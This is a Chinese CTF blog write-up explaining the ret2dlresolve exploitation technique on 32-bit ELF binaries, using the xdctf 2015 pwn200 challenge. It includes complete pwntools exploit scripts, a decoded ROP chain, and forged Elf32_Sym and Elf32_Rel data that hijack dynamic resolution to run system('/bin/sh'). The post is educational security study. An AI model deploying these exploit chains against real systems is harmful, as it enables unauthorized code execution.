---
layout: post
title: "[PWN]ret2dlresolve学习笔记（32位程序为例子）"
date: 2026-06-11
categories: [PWN]
---
# ret2dlresolve

本次学习以32位为例子，linux的动态链接使用的是\_dl\_runtime\_resolve(link\_map\_obj, reloc\_offset)。先来看看相关原理。

## 相关原理
（1）.dynamic的结构类似一个键值对数组，重定位表项、动态符号表、动态字符串表在其中的结构类似：

```bash
DT_SYMTAB 6 d_ptr //指向动态符号表
DT_STRTAB 5 d_ptr //指向动态字符串表
DT_REL 17 d_ptr  //重定位表，指向.rel.dyn
DT_RELA 7 d_ptr //重定位表，指向.rela.dyn
```

（2）ELF文件中，每个需要重定位的ELF节都有对应的重定位表，比如.text节如果需要重定位，那么就会对应.rel.text。在导入一个函数时，\_dl\_runtime\_resolve会根据reloc_offset（32位叫reloc\_arg，64位叫reloc\_index）去.rel.plt中找偏移对应的值，然后去.dynsym找对应的符号名称，再在.dynstr中找对应的函数名字符串。

![ref1](/assets/images/2026-06-11-ret2dlresolve/ref1.png)

（3）\_dl\_runtime\_resolve是用汇编编写的，32位和64位也有不同之处。这个函数的代码功能简单来说就是保存寄存器，然后调用\_dl\_fixup执行具体绑定的过程，64位的话，除了更多寄存器和用寄存器传参而非栈传参，就是最后返回的区别了，32位函数的最后是ret，64位则是jmp

因此如果能修改\_dl\_runtime\_resolve(link\_map\_obj, reloc\_offset)的参数，就能使这个函数在解析的时候解析到我们想去的函数。具体的，我们需要修改.dynamic节，因为这个节包含重定位表项、动态符号表、动态字符串表。
不过.dynamic没这么好改，开了RELRO的情况下，重定位表项、动态符号表、动态字符串表都是只读的，比较可行的思路是伪造重定位偏移reloc_offset，但是“我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。”

来看看不同情况的具体题目吧

## NoRelro 32

xdctf 2015 pwn200

源码
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

现在用gcc来编译32位版本

```bash
gcc -fno-stack-protector -m32 -z norelro -no-pie pwn.c -o norelro32
```

其实从题目也可以看出来不难，直接正常打就行了，这里用ret2dlresolve的技巧来打。先讲讲这个编译，可以看出来关闭了栈保护，关闭了relro（即关闭了GOT/PLT等的只读），关闭了pie，payload如下

```python
from pwn import *
context.log_level="debug"
context.terminal = ["tmux","new-window"]
context.arch="i386"
p = process("./norelro32")
rop = ROP("./norelro32")
elf = ELF("./norelro32")

gdb.attach(p, 'b main')

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'a')
rop.read(0,0x0804b184+4,4) # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.read(0,0x0804b260,len((dynstr))) # construct a fake dynstr section in bss
rop.read(0,0x0804b260+0x100,len(b"/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08049056) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(0x0804b260+0x100)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
print(rop.dump())
p.send(rop.chain())
p.send(p32(0x0804b260)) # hijack .dynstr to bss
p.send(dynstr)
p.send(b"/bin/sh\x00")
p.interactive()
```

下面来解析一下，首先因为关闭了RELRO，所以got、plt啥的就可以写了，当然了.dynamic节也会可写了，所以就通过写.dynamic节，把read替换成system，这样调用\_dl\_runtime\_resolve的时候，就会把read函数解析成system，然后就能getshell了，payload的执行过程如下

```bash
1.第一个read是程序原本的read，触发栈溢出，返回到我们rop的第一个read函数，往0x0804b184+4(即.dynamic节的DT_STRTAB的d_val)读取4字节，读入的内容是0x0804b260，这是一个bss的地址，也就是把.dynstr的位置劫持到我们可写的bss段
2.利用pwntools获取到原来.dynstr的完整内容，然后把里面的read替换成system，再利用rop链里的第二个read，把修改后的.dynstr读入到bss段
3.第三个read，往bss上读入/bin/sh
4.此时栈上的布局是0x08049056（下一个返回的地址），0xdeadbeef（下下个返回地址），函数参数。0x08049056就是read@plt的第二条指令，函数参数已被构造为system的参数，而此时.dynstr已被劫持，只要再次触发read的_dl_runtime_resolve就能解析到system执行
```

如图，这是.dynamic在IDA中的表现形式

![ref2](/assets/images/2026-06-11-ret2dlresolve/ref2.png)

为什么要劫持到read@plt的第二条指令呢，因为read先前已经执行并解析过了，如果劫持到第一条jmp，那么会直接跳到真实地址，而不是触发解析，下图是read@plt，可以看到第一条jmp，第二条push，第三条jmp。

![ref3](/assets/images/2026-06-11-ret2dlresolve/ref3.png)

顺便说说pwntools的这个rop对象，这个就相当于把平时p64自动打包好了，不用自己手写完整的链条了。

## PartialRelro 32

开了部分relro后，.dynamic就不可写了，需要自己伪造重定位表项。这里先简单说说大概怎么个伪造方法，其实和堆里面伪造一个fake chunk的原理差不多，在内存中找一个空的位置，根据重定位表的结构，伪造相关的数据，再让\_dl\_runtime\_resolve的reloc_offset参数指向我们伪造的那片内存的重定位项就可以了。pwntools里有自动构造dlresolve的payload的工具了，这里就来讲讲这个工具的使用的方式，和其构造的payload具体是怎么样的吧

```python
from pwn import *
context.log_level="debug"
context.terminal = ["tmux","new-window"]
context.arch="i386"

p = process("./partialrelro32")
rop = ROP("./partialrelro32")
elf = ELF("./partialrelro32")
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p.recvuntil(b'Welcome to XDCTF2015~!\n')
payload = flat({112:raw_rop, 256:dlresolve.payload})
p.sendline(payload)
p.interactive()
```

Ret2dlresolvePayload接收三个参数，一个是程序的elf对象，第二个参数是希望动态解析的目标函数字符串，这里是symbol="system"，第三个参数是第二个目标函数的参数，。这个函数构造好dlresolve对象后，调用dlresolve.data_addr计算可写的地址，就是计算可以把伪造的重定向表放在哪里，再调用rop.ret2dlresolve(dlresolve)，使程序在rop链的最后返回到\_dl\_runtime\_resolve执行解析。dlresolve.payload则是包含了完整的伪造重定向表。写成p32的形式，两个payload（忽略掉填充）分别是这样，raw_rop：

```python
rop_chain = (
    p32(0x08049050) +      # read@plt
    p32(0x0804901b) +      #  add esp, pop ebx, ret

    p32(0) +
    p32(0x0804ce00) +      # 程序中一个可读写的地址，可以去gdb里用vmmap来确认
    p32(0x65616161) +      # read的长度参数，这里直接被padding顶替了

    p32(0x08049020) +      # plt0
    p32(0x4a9c) +          # reloc_arg

    p32(0x68616161) +      #这个也是padding，这个位置无作用，因为system执行完也不会返回
    p32(0x0804ce24)        # "/bin/sh"地址
)
```

开始分析前先讲讲plt0这个东西，它的汇编代码是这样的

```assembly
.plt:08049020 sub_8049020     proc near               ; CODE XREF: .plt:0804903B↓j
.plt:08049020                                         ; .plt:0804904B↓j ...
.plt:08049020 ; __unwind {
.plt:08049020                 push    ds:dword_804B23C ; reloc_arg
.plt:08049026                 jmp     ds:dword_804B240 ; _dl_runtime_resolve
.plt:08049026 sub_8049020     endp
.plt:08049026
```

和NoRelro中讲到的jmp->push->jmp解析还不太一样，当跳转到这里的push执行的时候，\_dl\_runtime\_resolve并没有明确要解析什么函数，而是直接通过栈或者寄存器来传递reloc_arg参数，也就是说它要怎么解析全看栈或者寄存器上的数据，所以一般pwn都会利用这个来解析，这样无论程序的GOT里有没有对应函数，只要我们伪造了reloc_arg，就可以直接解析。

这样第一段payload的总体流程就很好懂了，先利用溢出漏洞，跳转到rop里的read，通过这个read我们可以往指定的地方写入数据，写的内容则是伪造的重定位表，写完之后进行栈的修正（esp与ebp），然后就跳转到plt0，这时候由于在栈上伪造好了reloc\_arg，所以就直接去解析内存中被伪造的重定位表执行system('/bin/sh')。

然后是dlresolve.payload部分，在这一部分我们会看到重定位表是怎么伪造的：

```python
dlresolve_payload = (
    b"system\x00"
    + b"acaaa"

    + p32(0x4b54)
    + p32(0)
    + p32(0)
    + p32(0)

    + p32(0x0804ce00)
    + p32(0x04c007)

    + b"/bin/sh\x00"
)
```

可以看看本文的第一副图片，现在要伪造的是.dynsym中的一个Elf32_Sym，其结构如下：

```c
typedef struct {
    Elf32_Word st_name;      // 符号名在字符串表中的偏移, 4 bytes
    Elf32_Addr st_value;     // 符号地址 , 4 bytes
    Elf32_Word st_size;      // 大小, 4 bytes
 
    unsigned char st_info; // 1 bytes
    unsigned char st_other; // 1 bytes
    Elf32_Half st_shndx;  // 2 bytes
} Elf32_Sym;
```

其中st_name不是符号的字符串，也不是地址，而是符号在.dynstr中的偏移，而我们的dlresolve.payload，是这样去设置这些值的：

```c
Elf32_Sym fake_sym = {
    .st_name  = 0x4b54,
    .st_value = 0,
    .st_size  = 0,

    .st_info  = 0,
    .st_other = 0,
    .st_shndx = 0
};
```

dlresolve.payload把这个伪造的Elf32_Sym放在了0x804ce0c，开启debug模式就可以看到；而dlresolve.payload开头的“system”字符串则被read写入到了0x0804ce00，终端使用readelf可以看到.dynstr的地址正是0x80482ac，而加上0x4b54，就正好是0x0804ce00。

![ref4](/assets/images/2026-06-11-ret2dlresolve/ref4.png)

不过还没完，dlresolve.payload的后段，p32(0x0804ce00) + p32(0x04c007)，还伪造了另一个东西，就是本文第一张图片里的Elf32_Rel，具体是这样伪造的：

```c
Elf32_Rel fake_rel = {
    .r_offset = 0x804ce00,
    .r_info   = 0x04c007
};
```

其中，r_info就是用来找到对应的Elf32_Sym，在x86里，它分为高24位和低8位，其中，低8位固定为7，不然链接器就不处理，高24位则用于索引对应的Elf32_Sym，这里高24位是0x0004c，那么就是去.dynsym（Symtab）的地址0x0804820c的第0x4c0条地方（注意这个0x4c0不是偏移量，而是说在表的第几个项目，算偏移量还需要乘上size，这里size是16）: 0x0804820c + 0x4c0 * F = 0x0804820c + 0x4c00 = 0x0804ce0c ，也就是之前放伪造的Elf32_Sym的地方。

最后该把两串payload连起来看的，看看\_dl\_runtime\_resolve是怎么找到伪造的Elf32_Rel的，其实很简单，我们触发plt0时，栈上的reloc_arg是0x4a9c，这个偏移值是和.rel.plt的0x08048380相加的（参考上一副图里的值吧），加起来就是0x0804ce1c，从read进去的偏移来算，刚好就是伪造的Elf32_Rel的地方，到这里PartialRelro 32的利用就算结束了。

## Full RELRO 32

这个模式下，REL相关的东西完全不可写了，程序开始执行前就会把函数地址解析完毕，\_dl\_runtime\_resolve也不使用了，不过应该还是存在绕过方法的，毕竟\_dl\_runtime\_resolve只是不用了，又不是删了，我查的资料中，似乎存在full relro下手动调用\_dl\_runtime\_resolve，手动构造重定位表的方法，某种特定的情况下也许确实能用，等做题多一点应该就知道了。


## 64位

64位的总体利用思路是和32差不多吧，这里只记录一下不同点，具体的题目做的时候再看吧（延迟绑定这一块）。

首先是ELF\_Rela变了，Rel后面多的a，表示多了一个addend,下面是它的结构体

```c
typedef struct { 
	Elf64_Addr r_offset; /* Address */ 8 bytes
	Elf64_Xword r_info; /* Relocation type and symbol index */ 8 bytes
	Elf64_Sxword r_addend; /* Addend */ 8 bytes
} Elf64_Rela; 
/* How to extract and insert information held in the r_info field. */ 
#define ELF64_R_SYM(i) ((i) >> 32) 
#define ELF64_R_TYPE(i) ((i) & 0xffffffff) 
#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) << 32) + (type))
```

Elf64\_Rela结构体的大小为24字节，注意结构体中的变量都是64位了。

然后是Elf64\_Sym的结构体如下，

```c
typedef struct { 
	Elf64_Word st_name; /* Symbol name (string tbl index) */ 4 bytes
	unsigned char st_info; /* Symbol type and binding */ 1 bytes
	unsigned char st_other; /* Symbol visibility */ 1 bytes
	Elf64_Section st_shndx; /* Section index */ 2 bytes
	Elf64_Addr st_value; /* Symbol value */ 8 bytes
	Elf64_Xword st_size; /* Symbol size */ 8 bytes
} Elf64_Sym;
```

Elf64_Word 32位，Elf64_Section 16位，Elf64_Addr 64位，Elf64_Xword 64位，合24字节。

64位下，xxx@plt中的第二行的push就不是偏移了，变成了待解析符号在重定位表中的索引，比如write函数push的是0。

还有一个要注意的点是，64位伪造重定位表，往往需要很多的溢出空间，如果程序没有这么多的栈给我们，我们还得自己实现栈迁移。

就先这样吧，实战遇到题目再记录吧。
